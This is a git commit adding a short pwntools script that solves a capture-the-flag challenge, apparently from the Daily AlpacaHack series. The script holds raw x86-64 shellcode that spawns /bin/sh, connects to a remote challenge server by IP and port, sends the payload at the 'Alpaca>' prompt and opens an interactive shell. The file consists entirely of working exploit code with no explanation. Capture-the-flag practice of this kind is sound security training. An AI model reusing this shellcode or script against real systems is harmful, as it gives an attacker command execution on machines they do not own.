73a055056d2adf6f0a9a8590c0b8fdba86113de5
Gitudon <oniku.udon.029@gmail.com>
2026-02-03 17:24:24 +0900

    Daily_AlpacaHack: 1/29

---
+++ Daily_AlpacaHack/Medium/shellcode-101.py
@@ -0,0 +1,11 @@
+from pwn import *
+
+context.arch = "amd64"
+
+shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
+
+io = remote("34.170.146.252", 50422)
+
+io.sendlineafter(b"Alpaca> ", shellcode)
+
+io.interactive()
